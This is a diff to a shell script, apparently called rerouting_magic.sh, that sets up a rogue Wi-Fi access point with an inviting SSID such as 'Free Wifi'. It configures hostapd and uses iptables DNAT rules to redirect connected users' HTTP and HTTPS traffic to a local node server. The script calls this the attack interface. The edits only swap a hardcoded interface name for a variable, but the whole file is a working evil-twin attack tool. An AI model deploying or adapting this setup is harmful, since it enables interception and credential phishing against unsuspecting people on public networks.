@@ -3,7 +3,7 @@
 
 print_usage(){
     echo "Usage: ./rerouting_magic.sh --ap <FAKE_AP_INTERFACE> --net <net_interface> --ssid <ssid>"
-    echo "Example: ./rerouting_magic.sh --ap wlxc83a35c2e0bb --net wlp2s0 --ssid \"Free Wifi\""
+    echo "Example: ./rerouting_magic.sh --ap $FAKE_AP_INTERFACE --net wlp2s0 --ssid \"Free Wifi\""
 }
 
 log(){
@@ -68,7 +68,7 @@ subnet 10.100.102.0 netmask 255.255.255.0 {
 
 # Path: /etc/hostapd/hostapd.conf
 cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.bak
-echo  "interface=wlxc83a35c2e0bb
+echo  "interface=$FAKE_AP_INTERFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
@@ -110,13 +110,13 @@ NET_IP=$(ifconfig $NET_INTERFACE | grep 'inet ' | awk '{print $2}')
 
 log "configuring iptables"
 iptables --table nat --flush
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 443 -j DNAT --to-destination $NET_IP:8443
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-destination $NET_IP:8000
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
+iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
+iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p udp --dport 443 -j DNAT --to-destination $NET_IP:8443
+iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $NET_IP:8000
+iptables -t nat -A PREROUTING -i $FAKE_AP_INTERFACE -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
 iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE
 
 log "starting node server"
-nohup npm run dev > server.log &
+nohup npm run dev &
 
 log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"
